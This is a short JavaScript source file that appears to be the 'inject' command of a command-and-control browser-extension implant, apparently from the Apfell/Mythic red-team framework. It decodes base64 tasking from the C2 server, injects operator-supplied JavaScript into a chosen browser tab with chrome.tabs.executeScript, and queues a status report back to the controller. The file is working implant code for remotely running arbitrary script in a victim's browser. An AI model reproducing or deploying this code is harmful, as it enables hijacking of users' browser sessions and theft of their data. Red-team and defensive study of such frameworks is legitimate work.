inject = function(params) {
    // execute custom javascript code in a tab
    let args = JSON.parse(atob(params['data'].toString()));
    const tab = Math.round(args["tabid"]);
    const code = atob(args["javascript"]);
    let taskid = params['taskid'];
    let tasktype = params['tasktype'];
    chrome.tabs.executeScript(tab, {
        code: code
    }, function(){
        if (chrome.runtime.lastError) {
            C2.sendError(taskid, tasktype);
        } else {
            const started = btoa(unescape(encodeURIComponent(JSON.stringify({'status': 'started'}, null, 2))));
            const apfellmsg = CreateApfellMessage(2, apfell.apfellID, apfell.UUID, started.length, taskid, tasktype, started);
            let meta = {};
            meta["metatype"] = 3;
            meta["metadata"] = apfellmsg;
            const metaenvelope = JSON.stringify(meta);
            out.push(metaenvelope);
        }
    });
};

C2.commands[inject.name] = inject;
COMMAND_ENDS_HERE
